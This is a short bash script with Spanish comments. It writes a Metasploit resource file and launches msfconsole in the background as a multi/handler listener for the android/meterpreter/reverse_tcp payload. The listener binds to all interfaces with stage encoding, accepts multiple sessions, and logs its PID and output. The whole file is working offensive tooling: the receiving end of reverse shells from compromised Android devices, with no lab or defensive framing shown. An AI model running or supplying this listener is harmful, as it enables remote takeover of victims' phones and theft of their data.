#!/bin/bash

# Script para iniciar listener de Metasploit en segundo plano
# Uso: ./start_listener.sh <LPORT>

LPORT=${1:-"4444"}
PID_FILE="/tmp/msf_listener.pid"

echo "Iniciando listener de Metasploit en puerto $LPORT..."

# Crear script de resource para msfconsole
cat > /tmp/msf_listener.rc << EOF
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport $LPORT
set exitonsession false
set EnableStageEncoding true
exploit -j
EOF

# Iniciar msfconsole en segundo plano con el resource file
nohup msfconsole -r /tmp/msf_listener.rc > /tmp/msf_listener.log 2>&1 &
MSF_PID=$!

echo $MSF_PID > $PID_FILE
echo "Listener iniciado con PID: $MSF_PID"
echo "Logs: /tmp/msf_listener.log"
echo "Para detener: kill $MSF_PID"

# Esperar un momento y verificar que esté corriendo
sleep 3
if ps -p $MSF_PID > /dev/null; then
    echo "Listener está activo y esperando conexiones..."
else
    echo "Error: Listener no pudo iniciarse. Verificar logs en /tmp/msf_listener.log"
    exit 1
fi
